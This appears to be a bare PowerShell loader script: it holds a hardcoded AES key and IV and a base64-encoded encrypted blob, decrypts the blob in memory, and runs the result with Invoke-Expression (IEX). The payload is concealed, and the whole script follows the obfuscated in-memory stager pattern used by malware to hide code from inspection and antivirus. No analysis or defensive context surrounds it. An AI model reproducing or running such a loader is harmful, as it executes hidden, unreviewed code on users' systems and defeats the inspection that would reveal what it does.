$key = [System.Text.Encoding]::UTF8.GetBytes("PhantomKey1234567890123456789012")
$iv = [System.Text.Encoding]::UTF8.GetBytes("1234567890123456")
$enc = "rZWLNLcpuMnGExephNEDAeqtl3Ef/Xx3oYUihu5cMvV/vDt/3A1b6rauTffGeL7uNyUPkUzngszbz7PqqzZJ0kd/lLOHwAD+kUVj4l8rSTXKOXaeG1eTroHzPL1AhN3IFVQWtTEfve2jBZ2qpvgqgmr7l25frtrxCTQzHoSM0s8m0il/esD7IaAo0mwj/3IigBQTs8kutITeMSR2WD8F3NcaVVnggyaRRwHl/q3GD+pIJIpRZ1lIf+S6pmNqxndJqLs5mg0Ouln3E5ZETXpP53uIe4KLXMmT6vMQNVk4HS8Us2CLGOvzJA2bFP/zv5QD63HTzfLu5O9huyqhqF+n6LdjKLCwcb2ym2sxMuutSO29W/DKoQx+wtlQU3zFdetcun3Ygiap2+MK8FClsUq3VKzDptA1d3A1yTtYj/oPI4oMyM72w+W5zCVRWeZVkw0ZateS5WqyUEQkhB8sk3DD0r06/eJvDkJC7mEZ4UBHx4m7J5LvPpDfdUIBFZmIXAspNt26xqJ4IImopRDDf/TiTXNvA9qsEOMc9G+xy8fLk1p1SR2naBGbOhoe7YRrl7uom/BPGWeaXz2FD6KoUjs6zdAlOUmp6EYpYH+2cjUg2r8EI4WRf2ygj8updX8e/zf3fWzu7waUmhSEJz9ipytUs7Vv0jgCLrMJiYDe74f/UTqOZAcrphX+CWYXM7vF8SKAPZR6O8fqKUVv/2Inlw2puG/pobFH1IawFza0kIgM0pBdrwtmXM2cIy4l+Sbj7xUPwrg5+qOXLN6Gh3BU3MUoZKZb3Eg6DOvmnggRMNCCtfMmZl00M+h0nQSDa9HE/gcWOBDiTHZQEZqPquH3MzbCLmujpyFmGI4YEXaeds1FtHTqisPa53d7jZc8R1Gzl+RBILFTcCfXCI795usbwa31cY6p1jtbYXrFgs+sjW4KHQxdlYmeNnz4Tn84UnIkflNMp3uICeVx4aW2Ebr4Cl/lrf+3FTHo2ofyRCewfs3xJ2g="
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv
$ms = New-Object System.IO.MemoryStream(,[Convert]::FromBase64String($enc))
$cs = New-Object System.Security.Cryptography.CryptoStream($ms, $aes.CreateDecryptor(), [System.Security.Cryptography.CryptoStreamMode]::Read)
$sr = New-Object System.IO.StreamReader($cs)
$decryptedScript = $sr.ReadToEnd()
$sr.Close();$cs.Close();$ms.Close()
IEX $decryptedScript
